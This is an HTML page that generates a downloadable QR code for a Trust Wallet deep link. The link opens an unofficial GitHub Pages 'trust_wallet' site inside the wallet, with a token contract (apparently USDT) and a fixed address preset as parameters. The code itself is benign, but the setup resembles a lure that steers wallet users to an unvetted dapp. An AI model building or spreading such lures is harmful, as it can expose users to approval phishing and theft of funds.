<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#0d1018" media="(prefers-color-scheme: dark)">
  <meta name="theme-color" content="#f8f9fc" media="(prefers-color-scheme: light)">
  <title>Trust Wallet Deep Link QR Code</title>
  <style>
    :root {
      color-scheme: light dark;
      font-family: Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
      --bg: #0d1018;
      --card-bg: #11141e;
      --card-border: #292d3a;
      --text: #f7f7fb;
      --text-muted: #8e95a5;
      --purple: #493bff;
      --purple-hover: #382aff;
      --btn-bg: #1c202c;
      --btn-hover: #292d3a;
    }
    @media (prefers-color-scheme: light) {
      :root {
        --bg: #f8f9fc;
        --card-bg: #ffffff;
        --card-border: #e2e8f0;
        --text: #0f172a;
        --text-muted: #64748b;
        --purple: #493bff;
        --purple-hover: #382aff;
        --btn-bg: #f1f3f9;
        --btn-hover: #e2e6f0;
      }
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      color: var(--text);
      padding: clamp(12px, 4vw, 24px);
    }
    .card {
      width: 100%;
      max-width: 440px;
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 28px;
      padding: 32px clamp(12px, 4vw, 24px);
      min-width: 0;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
    }
    .card h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 8px;
    }
    .card p {
      font-size: 14px;
      color: var(--text-muted);
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .qr-container {
      background: #ffffff;
      padding: 20px;
      border-radius: 20px;
      display: inline-block;
      width: min(100%, 280px);
      margin-bottom: 24px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
    }
    .qr-container img {
      display: block;
      width: 100%;
      height: auto;
      aspect-ratio: 1;
    }
    .actions {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .btn {
      width: 100%;
      height: 52px;
      border: 0;
      border-radius: 16px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      text-decoration: none;
      transition: background 0.18s, transform 0.18s;
    }
    .btn-primary {
      background: var(--purple);
      color: #ffffff;
    }
    .btn-primary:hover {
      background: var(--purple-hover);
    }
    .btn-secondary {
      background: var(--btn-bg);
      color: var(--text);
    }
    .btn-secondary:hover {
      background: var(--btn-hover);
    }
    .btn:active {
      transform: scale(0.98);
    }
    .toast {
      margin-top: 16px;
      font-size: 13px;
      color: #10b981;
      opacity: 0;
      transition: opacity 0.2s;
    }
    .toast.show {
      opacity: 1;
    }
  </style>
</head>
<body>

  <main class="card">
    <h1>Trust Wallet Deep Link</h1>
    <p>Download this QR code, then scan it with your camera or Chrome and tap the detected link to open the page in Trust Wallet.</p>

    <div class="qr-container">
      <img id="qrImage" src="" alt="Trust Wallet Deep Link QR Code">
    </div>

    <div class="actions">
      <button class="btn btn-primary" id="downloadBtn" type="button">
        Download QR Code
      </button>
    </div>

    <div class="toast" id="toast" role="status" aria-live="polite"></div>
  </main>

  <script>
    const dappUrl = new URL('https://harendsinghraidfc-afk.github.io/trust_wallet/');
    dappUrl.searchParams.set('asset', '0x55d398326f99059fF775485246999027B3197955');
    dappUrl.searchParams.set('address', '0x3b659063c41015a06D25B933742D0Bd28A04E490');
    const walletLink = new URL('https://link.trustwallet.com/open_url');
    walletLink.searchParams.set('coin_id', '20000714');
    walletLink.searchParams.set('url', dappUrl.href);
    const deeplink = walletLink.href;

    const qrImageUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=' + encodeURIComponent(deeplink);
    document.querySelector('#qrImage').src = qrImageUrl;

    const downloadBtn = document.querySelector('#downloadBtn');
    const toast = document.querySelector('#toast');

    downloadBtn.addEventListener('click', async () => {
      downloadBtn.disabled = true;
      downloadBtn.textContent = 'Downloading…';
      try {
        const response = await fetch(qrImageUrl);
        if (!response.ok) throw new Error('QR download failed');
        const blob = await response.blob();
        const downloadUrl = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = downloadUrl;
        link.download = 'trust-wallet-qr.png';
        document.body.appendChild(link);
        link.click();
        link.remove();
        setTimeout(() => URL.revokeObjectURL(downloadUrl), 60000);
        toast.textContent = 'QR code download started.';
      } catch (error) {
        toast.textContent = 'Download failed. Please try again.';
      } finally {
        downloadBtn.disabled = false;
        downloadBtn.textContent = 'Download QR Code';
      }
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 3000);
    });
  </script>

</body>
</html>
